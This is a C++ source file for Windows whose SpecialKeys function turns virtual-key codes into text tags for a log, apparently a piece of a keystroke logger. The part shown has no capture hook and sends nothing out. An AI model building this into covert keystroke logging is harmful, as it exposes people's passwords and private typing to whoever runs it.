#include <Windows.h>
#include <winuser.h>
#include <bits/stdc++.h>
#include "log.h"

using namespace std;

bool SpecialKeys(int S_Key) {//Special Keys log
	switch (S_Key) {
	case VK_BACK://0x08
		LOG("[B.Sp]");
		return true;
	case VK_TAB://0x09
		LOG("[Tab]");
		return true;
	case VK_RETURN://0x0D
		LOG("[Enter]");
		return true;
	case VK_SHIFT://0x10
		LOG("[Shift]");
		return true;
	case VK_CONTROL://0x11
		LOG("[Ctrl]");
		return true;
	case VK_MENU://0x12
		LOG("[Alt]");
		return true;
	case VK_CAPITAL://0x14
		LOG("[Caps]");
		return true;
	case VK_ESCAPE://0x1B
		LOG("[Esc]");
		return true;
	case VK_SPACE://0x20
		LOG(" ");
		return true;
	case VK_PRIOR://0x21
		LOG("[PgUp]");
		return true;
	case VK_NEXT://0x22
		LOG("[PgDn]");
		return true;
	case VK_END://0x23
		LOG("[End]");
		return true;
	case VK_HOME://0x24
		LOG("[Home]");
		return true;
	case VK_LEFT://0x25
		LOG("[Left]");
		return true;
	case VK_UP://0x26
		LOG("[Up]");
		return true;
	case VK_RIGHT://0x27
		LOG("[Right]");
		return true;
	case VK_DOWN://0x28
		LOG("[Down]");
		return true;
	case VK_DELETE://0x2E
		LOG("[Del]");
		return true;
	case VK_MULTIPLY://0x6A
		LOG("*");
		return true;
	case VK_ADD://0x6B
		LOG("+");
		return true;
	case VK_SUBTRACT://0x6D
		LOG("-");
		return true;
	case VK_DIVIDE://0x6F
		LOG("/");
		return true;
	case VK_DECIMAL://0x6E
		LOG(".");
		return true;
	case VK_F1://0x70
		LOG("[F1]");
		return true;
	case VK_F2://0x71
		LOG("[F2]");
		return true;
	case VK_F3://0x72
		LOG("[F3]");
		return true;
	case VK_F4://0x73
		LOG("[F4]");
		return true;
	case VK_F5://0x74
		LOG("[F5]");
		return true;
	case VK_F6://0x75
		LOG("[F6]");
		return true;
	case VK_F7://0x76
		LOG("[F7]");
		return true;
	case VK_F8://0x77
		LOG("[F8]");
		return true;
	case VK_F9://0x78
		LOG("[F9]");
		return true;
	case VK_F10://0x79
		LOG("[F10]");
		return true;
	case VK_F11://0x7A
		LOG("[F11]");
		return true;
	case VK_F12://0x7B
		LOG("[F12]");
		return true;
	case VK_OEM_COMMA://0xBC
		LOG(", ");
		return true;
	case VK_OEM_PERIOD://0xBE
		LOG(". ");
		return true;
	default:
		return false;
	}
}
